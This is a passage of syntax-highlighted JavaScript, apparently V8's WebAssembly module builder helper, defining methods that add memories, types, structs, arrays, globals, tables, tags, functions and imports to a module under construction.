start_index<span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addMemory</span><span class="token punctuation">(</span><span class="token parameter">min<span class="token punctuation">,</span> max<span class="token punctuation">,</span> shared</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token comment">// Note: All imported memories are added before declared ones (see the check</span>          <span class="token comment">// in &#123;addImportedMemory&#125;).</span>          <span class="token keyword">const</span> imported_memories <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>            <span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token operator">=></span> i<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalMemory          <span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>          <span class="token keyword">const</span> mem_index <span class="token operator">=</span> imported_memories <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memories<span class="token punctuation">.</span>length<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>memories<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">min</span><span class="token operator">:</span> min<span class="token punctuation">,</span>            <span class="token literal-property property">max</span><span class="token operator">:</span> max<span class="token punctuation">,</span>            <span class="token literal-property property">shared</span><span class="token operator">:</span> shared <span class="token operator">||</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token literal-property property">is_memory64</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> mem_index<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addMemory64</span><span class="token punctuation">(</span><span class="token parameter">min<span class="token punctuation">,</span> max<span class="token punctuation">,</span> shared</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token comment">// Note: All imported memories are added before declared ones (see the check</span>          <span class="token comment">// in &#123;addImportedMemory&#125;).</span>          <span class="token keyword">const</span> imported_memories <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>            <span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token operator">=></span> i<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalMemory          <span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>          <span class="token keyword">const</span> mem_index <span class="token operator">=</span> imported_memories <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memories<span class="token punctuation">.</span>length<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>memories<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">min</span><span class="token operator">:</span> min<span class="token punctuation">,</span>            <span class="token literal-property property">max</span><span class="token operator">:</span> max<span class="token punctuation">,</span>            <span class="token literal-property property">shared</span><span class="token operator">:</span> shared <span class="token operator">||</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token literal-property property">is_memory64</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> mem_index<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addExplicitSection</span><span class="token punctuation">(</span><span class="token parameter">bytes</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>explicit<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">stringToBytes</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Binary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          result<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> name<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            result<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">createCustomSection</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> bytes</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          name <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">stringToBytes</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">var</span> section <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Binary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span>length <span class="token operator">+</span> bytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>          section<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>          section<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> section<span class="token punctuation">.</span><span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addCustomSection</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> bytes</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>explicit<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">createCustomSection</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// We use &#123;is_final = true&#125; so that the MVP syntax is generated for</span>        <span class="token comment">// signatures.</span>        <span class="token function">addType</span><span class="token punctuation">(</span><span class="token parameter">type<span class="token punctuation">,</span> supertype_idx <span class="token operator">=</span> kNoSuperType<span class="token punctuation">,</span> is_final <span class="token operator">=</span> <span class="token boolean">true</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> pl <span class="token operator">=</span> type<span class="token punctuation">.</span>params<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token comment">// should have params</span>          <span class="token keyword">var</span> rl <span class="token operator">=</span> type<span class="token punctuation">.</span>results<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token comment">// should have results</span>          <span class="token keyword">var</span> type_copy <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">params</span><span class="token operator">:</span> type<span class="token punctuation">.</span>params<span class="token punctuation">,</span>            <span class="token literal-property property">results</span><span class="token operator">:</span> type<span class="token punctuation">.</span>results<span class="token punctuation">,</span>            <span class="token literal-property property">is_final</span><span class="token operator">:</span> is_final<span class="token punctuation">,</span>            <span class="token literal-property property">supertype</span><span class="token operator">:</span> supertype_idx<span class="token punctuation">,</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>type_copy<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addLiteralStringRef</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>stringrefs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>stringrefs<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addStruct</span><span class="token punctuation">(</span><span class="token parameter">fields<span class="token punctuation">,</span> supertype_idx <span class="token operator">=</span> kNoSuperType<span class="token punctuation">,</span> is_final <span class="token operator">=</span> <span class="token boolean">false</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WasmStruct</span><span class="token punctuation">(</span>fields<span class="token punctuation">,</span> is_final<span class="token punctuation">,</span> supertype_idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addArray</span><span class="token punctuation">(</span>          <span class="token parameter">type<span class="token punctuation">,</span>          mutability<span class="token punctuation">,</span>          supertype_idx <span class="token operator">=</span> kNoSuperType<span class="token punctuation">,</span>          is_final <span class="token operator">=</span> <span class="token boolean">false</span></span>        <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>            <span class="token keyword">new</span> <span class="token class-name">WasmArray</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> mutability<span class="token punctuation">,</span> is_final<span class="token punctuation">,</span> supertype_idx<span class="token punctuation">)</span>          <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">static</span> <span class="token function">defaultFor</span><span class="token punctuation">(</span><span class="token parameter">type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">case</span> <span class="token literal-property property">kWasmI32</span><span class="token operator">:</span>              <span class="token keyword">return</span> <span class="token function">wasmI32Const</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token literal-property property">kWasmI64</span><span class="token operator">:</span>              <span class="token keyword">return</span> <span class="token function">wasmI64Const</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token literal-property property">kWasmF32</span><span class="token operator">:</span>              <span class="token keyword">return</span> <span class="token function">wasmF32Const</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token literal-property property">kWasmF64</span><span class="token operator">:</span>              <span class="token keyword">return</span> <span class="token function">wasmF64Const</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token literal-property property">kWasmS128</span><span class="token operator">:</span>              <span class="token keyword">return</span> <span class="token punctuation">[</span>kSimdPrefix<span class="token punctuation">,</span> kExprS128Const<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token operator">:</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> type <span class="token operator">!=</span> <span class="token string">"number"</span> <span class="token operator">&amp;&amp;</span> type<span class="token punctuation">.</span>opcode <span class="token operator">!=</span> kWasmRefNull<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Non-defaultable type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              <span class="token keyword">let</span> heap_type <span class="token operator">=</span> <span class="token keyword">typeof</span> type <span class="token operator">==</span> <span class="token string">"number"</span> <span class="token operator">?</span> type <span class="token operator">:</span> type<span class="token punctuation">.</span>heap_type<span class="token punctuation">;</span>              <span class="token keyword">return</span> <span class="token punctuation">[</span>                kExprRefNull<span class="token punctuation">,</span>                <span class="token operator">...</span><span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span>heap_type<span class="token punctuation">,</span> kMaxVarInt32Size<span class="token punctuation">)</span><span class="token punctuation">,</span>              <span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addGlobal</span><span class="token punctuation">(</span><span class="token parameter">type<span class="token punctuation">,</span> mutable<span class="token punctuation">,</span> init</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>init <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> init <span class="token operator">=</span> WasmModuleBuilder<span class="token punctuation">.</span><span class="token function">defaultFor</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">checkExpr</span><span class="token punctuation">(</span>init<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> glob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmGlobalBuilder</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> type<span class="token punctuation">,</span> mutable<span class="token punctuation">,</span> init<span class="token punctuation">)</span><span class="token punctuation">;</span>          glob<span class="token punctuation">.</span>index <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>globals<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_globals<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>globals<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>glob<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> glob<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addTable</span><span class="token punctuation">(</span>          <span class="token parameter">type<span class="token punctuation">,</span>          initial_size<span class="token punctuation">,</span>          max_size <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span>          init_expr <span class="token operator">=</span> <span class="token keyword">undefined</span></span>        <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>            type <span class="token operator">==</span> kWasmI32 <span class="token operator">||</span>            type <span class="token operator">==</span> kWasmI64 <span class="token operator">||</span>            type <span class="token operator">==</span> kWasmF32 <span class="token operator">||</span>            type <span class="token operator">==</span> kWasmF64 <span class="token operator">||</span>            type <span class="token operator">==</span> kWasmS128 <span class="token operator">||</span>            type <span class="token operator">==</span> kWasmVoid          <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Tables must be of a reference type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>init_expr <span class="token operator">!=</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token function">checkExpr</span><span class="token punctuation">(</span>init_expr<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> table <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmTableBuilder</span><span class="token punctuation">(</span>            <span class="token keyword">this</span><span class="token punctuation">,</span>            type<span class="token punctuation">,</span>            initial_size<span class="token punctuation">,</span>            max_size<span class="token punctuation">,</span>            init_expr          <span class="token punctuation">)</span><span class="token punctuation">;</span>          table<span class="token punctuation">.</span>index <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tables<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_tables<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>tables<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> table<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addTag</span><span class="token punctuation">(</span><span class="token parameter">type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">let</span> type_index <span class="token operator">=</span> <span class="token keyword">typeof</span> type <span class="token operator">==</span> <span class="token string">"number"</span> <span class="token operator">?</span> type <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> tag_index <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>tags<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_tags<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>tags<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>type_index<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> tag_index<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> type<span class="token punctuation">,</span> arg_names</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          arg_names <span class="token operator">=</span> arg_names <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> type_index <span class="token operator">=</span> <span class="token keyword">typeof</span> type <span class="token operator">==</span> <span class="token string">"number"</span> <span class="token operator">?</span> type <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> num_args <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>types<span class="token punctuation">[</span>type_index<span class="token punctuation">]</span><span class="token punctuation">.</span>params<span class="token punctuation">.</span>length<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>num_args <span class="token operator">&lt;</span> arg_names<span class="token punctuation">.</span>length<span class="token punctuation">)</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"too many arg names provided"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>num_args <span class="token operator">></span> arg_names<span class="token punctuation">.</span>length<span class="token punctuation">)</span>            arg_names<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>num_args <span class="token operator">-</span> arg_names<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">let</span> func <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WasmFunctionBuilder</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> type_index<span class="token punctuation">,</span> arg_names<span class="token punctuation">)</span><span class="token punctuation">;</span>          func<span class="token punctuation">.</span>index <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>functions<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_funcs<span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>functions<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> func<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addImport</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> name<span class="token punctuation">,</span> type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>functions<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>              <span class="token string">"Imported functions must be declared before local ones"</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">let</span> type_index <span class="token operator">=</span> <span class="token keyword">typeof</span> type <span class="token operator">==</span> <span class="token string">"number"</span> <span class="token operator">?</span> type <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">addType</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">module</span><span class="token operator">:</span> module<span class="token punctuation">,</span>            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalFunction<span class="token punctuation">,</span>            <span class="token literal-property property">type_index</span><span class="token operator">:</span> type_index<span class="token punctuation">,</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_funcs<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addImportedGlobal</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> name<span class="token punctuation">,</span> type<span class="token punctuation">,</span> mutable <span class="token operator">=</span> <span class="token boolean">false</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>globals<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>              <span class="token string">"Imported globals must be declared before local ones"</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">module</span><span class="token operator">:</span> module<span class="token punctuation">,</span>            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalGlobal<span class="token punctuation">,</span>            <span class="token literal-property property">type</span><span class="token operator">:</span> type<span class="token punctuation">,</span>            <span class="token literal-property property">mutable</span><span class="token operator">:</span> mutable<span class="token punctuation">,</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>num_imported_globals<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addImportedMemory</span><span class="token punctuation">(</span>          <span class="token parameter">module<span class="token punctuation">,</span>          name<span class="token punctuation">,</span>          initial <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>          maximum<span class="token punctuation">,</span>          shared<span class="token punctuation">,</span>          is_memory64</span>        <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>memories<span class="token punctuation">.</span>length <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>              <span class="token string">"Add imported memories before declared memories to avoid messing "</span> <span class="token operator">+</span>                <span class="token string">"up the indexes"</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">let</span> mem_index <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>            <span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token operator">=></span> i<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalMemory          <span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>          <span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">module</span><span class="token operator">:</span> module<span class="token punctuation">,</span>            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalMemory<span class="token punctuation">,</span>            <span class="token literal-property property">initial</span><span class="token operator">:</span> initial<span class="token punctuation">,</span>            <span class="token literal-property property">maximum</span><span class="token operator">:</span> maximum<span class="token punctuation">,</span>            <span class="token literal-property property">shared</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">!</span>shared<span class="token punctuation">,</span>            <span class="token literal-property property">is_memory64</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">!</span>is_memory64<span class="token punctuation">,</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> mem_index<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">addImportedTable</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> name<span class="token punctuation">,</span> initial<span class="token punctuation">,</span> maximum<span class="token punctuation">,</span> type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>tables<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>              <span class="token string">"Imported tables must be declared before local ones"</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">module</span><span class="token operator">:</span> module<span class="token punctuation">,</span>            <span class="token literal-property property">name</span><span class="token operator">:</span> name<span class="token punctuation">,</span>            <span class="token literal-property property">kind</span><span class="token operator">:</span> kExternalTable<span class="token punctuation">,</span>            <span class="token literal-property property">initial</span><span class="token operator">:</span> initial<span class="token punctuation">,</span>            <span class="token literal-property property">maximum</span><span class="token operator">:</span> maximum<span class="token punctuation">,</span>            <span class="token literal-property property">type</span><span class="token operator">:</span> type <span class="token operator">||</span> kWasmFuncRef<span class="token punctuation">,</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>imports<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>o<span class="token 